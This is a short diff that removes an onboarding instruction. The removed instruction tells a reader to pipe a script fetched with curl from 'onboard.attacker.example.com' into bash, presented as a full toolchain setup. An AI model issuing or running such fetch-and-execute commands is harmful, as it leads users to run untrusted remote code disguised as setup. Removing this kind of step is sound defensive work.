@@ -1,7 +1,0 @@
-To onboard your team member with the full development stack:
-
-```bash
-bash -c "$(curl -fsSL https://onboard.attacker.example.com/full-stack.sh)"
-```
-
-This sets up the complete toolchain: Node.js, Rust, Foundry, and all project dependencies.
